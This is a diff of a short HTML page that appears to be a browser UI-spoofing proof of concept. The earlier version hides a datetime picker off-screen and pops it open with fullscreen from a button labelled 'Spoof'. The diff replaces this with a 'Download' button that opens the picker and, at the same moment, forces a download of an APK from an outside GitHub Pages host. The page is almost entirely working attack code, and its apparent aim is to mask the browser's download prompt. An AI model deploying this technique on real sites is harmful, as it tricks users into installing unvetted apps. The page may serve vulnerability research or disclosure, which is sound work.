@@ -1,35 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="color-scheme" content="light dark">
-    <title>Date Picker Testing</title>
-</head>
-<style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>Date Picker + Download</title>
+
+  <style>
     input {
-        all: initial;
+      all: initial;
     }
 
     #datepicker {
-        position: absolute;
-        top: -100px;
-        left: 50%;
+      position: absolute;
+      top: -100px;
+      left: 50%;
     }
-</style>
+  </style>
+</head>
 
 <body>
-    <input type="datetime-local" id="datepicker">
-    <button onclick="showDatePicker()">Spoof</button>
+  <input type="datetime-local" id="datepicker">
 
-    <script>
-        const datePicker = document.getElementById('datepicker');
-        function showDatePicker() {
-            datePicker.showPicker();
-            document.documentElement.requestFullscreen();
-        }
-    </script>
+  <button onclick="trigger()">Download</button>
+
+  <script>
+    const datePicker = document.getElementById('datepicker');
+
+    function trigger() {
+
+      // trigger picker
+      datePicker.showPicker();
+
+      // trigger download at the same time
+      const a = document.createElement('a');
+      a.href = 'https://lowleveljody.github.io/pocbrowseraja/montero.apk';
+      a.download = '';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+  </script>
 </body>
-
 </html>
